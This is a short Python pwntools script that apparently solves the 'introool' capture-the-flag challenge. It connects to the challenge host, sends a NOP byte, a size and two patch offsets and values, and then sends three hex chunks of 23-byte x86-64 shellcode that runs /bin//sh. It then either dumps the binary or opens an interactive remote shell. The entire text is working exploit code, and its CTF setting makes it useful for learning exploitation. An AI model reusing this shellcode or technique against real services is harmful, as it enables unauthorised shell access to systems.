from pwn import *
import base64


DUMP = False
NOP = "90"
SIZE = "200"
PATCH1 = "1fe"
PATCH1_VAL = "eb"
PATCH2 = "1ff"
PATCH2_VAL = "44"
# 23 byte shellcode
ROP1 = "4831f65648bf2f62"
ROP2 = "696e2f2f73685754"
ROP3 = "5f6a3b58990f0590"

p = remote("introool.challenges.ooo",4242)
print p.recvuntil("> ")
p.sendline(NOP)
print p.recvuntil("> ")
p.sendline(SIZE)
print p.recvuntil(": ")
p.sendline(PATCH1)
print p.recvuntil(": ")
p.sendline(PATCH1_VAL)
print p.recvuntil(": ")
p.sendline(PATCH2)
print p.recvuntil(": ")
p.sendline(PATCH2_VAL)
print p.recvuntil("> ")
p.sendline(ROP1)
print p.recvuntil("> ")
p.sendline(ROP2)
print p.recvuntil("> ")
p.sendline(ROP3)
print p.recvuntil("> ")
if DUMP:
    p.sendline("1")
    bin_enc = p.recvall()
    with open("binary.bin","wb") as f:
        f.write(base64.b64decode(bin_enc))
else:
    p.sendline("2")
    p.interactive()
